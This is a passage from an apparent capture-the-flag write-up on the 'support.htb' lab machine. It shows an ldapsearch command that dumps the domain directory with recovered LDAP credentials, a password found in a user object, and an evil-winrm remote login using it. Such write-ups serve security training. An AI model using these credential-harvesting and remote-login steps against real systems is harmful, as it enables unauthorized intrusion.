## Foothold
We now have the credentials to craft our own LDAP query based on the one seen in dnSpy.
`UserInfo.exe` query:
![](screenshots/Pasted%20image%2020220826222651.png)
Our query:
```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb'
```
This queries all objects in the domain `support.htb` and we find what appears to be a password for the user `support`.
![](screenshots/Pasted%20image%2020220826223055.png)
Lets login to WinRM using the credentials `support / Ironside47pleasure40Watchful`
```bash
evil-winrm -i 10.129.49.99 -u support -p Ironside47pleasure40Watchful
```
![](screenshots/Pasted%20image%2020220826223750.png)

---
[privilege-escalation](privilege-escalation.md)